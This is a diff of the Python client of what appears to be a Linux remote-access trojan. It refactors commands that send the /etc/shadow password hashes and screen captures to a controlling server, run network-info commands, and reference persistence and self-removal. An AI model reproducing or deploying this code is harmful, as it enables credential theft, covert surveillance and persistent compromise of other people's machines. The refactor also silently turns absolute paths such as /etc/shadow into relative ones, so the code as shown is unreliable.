@@ -3,24 +3,21 @@ import secrets
 import shutil, mss, mss.tools
 
 from client import Client
-from symbols import *
+
+SHADOW_PATH = os.path.join("etc", "shadow")
+
 
 class LinuxClient(Client):
+
+    ####################################################################################################################
+    ################################################# CONSTRUCTOR ######################################################
+    ####################################################################################################################
     def __init__(self, server_address, server_port):
         super().__init__(server_address, server_port)
 
-    def screenshot(self, args):
-        screen_path = f"/tmp/{secrets.token_hex(5)}.jpg"
-
-        with mss.mss() as sct:
-            screenshot = sct.grab(sct.monitors[0])
-            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
-
-        with open(screen_path, 'rb') as f:
-            while (chunk := f.read(4096)):
-                self.secure_sock.sendall(chunk)
-        self.secure_sock.sendall(SIG_EOF)
-        os.remove(screen_path)
+    ####################################################################################################################
+    ############################################## USUAL METHODS #######################################################
+    ####################################################################################################################
 
     def persistence(self):
 
@@ -47,23 +44,29 @@ class LinuxClient(Client):
 
         # TODO Self removing the executable
 
+
+    ####################################################################################################################
+    ########################################### CLIENT COMMANDS ########################################################
+    ####################################################################################################################
+
     def hashdump(self, args):
-        if os.access('/etc/shadow', os.R_OK):
-            try:
-                with open('/etc/shadow', 'rb') as f:
-                    while (chunk := f.read(4096)):
-                        self.secure_sock.sendall(chunk)
-                self.secure_sock.sendall(SIG_EOF)
-            except Exception as e:
-                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
-        else:
-            # Sending error code if user doesnt have permissions to dump hashes
-            self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
+        self.send_file(SHADOW_PATH)
 
     def ipconfig(self, args):
+        output = ""
         try:
             output = subprocess.check_output("ip a", shell=True, text=True, encoding='utf-8', stderr=subprocess.STDOUT)
         except subprocess.CalledProcessError as e:
             output = e.output
         finally:
             self.secure_sock.sendall(output.encode())
+
+    def screenshot(self, args):
+        screen_path = os.path.join("tmp", f"{secrets.token_hex(5)}.jpg")
+
+        with mss.mss() as sct:
+            screenshot = sct.grab(sct.monitors[0])
+            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
+
+        self.send_file(screen_path)
+        self.delete_file(screen_path)
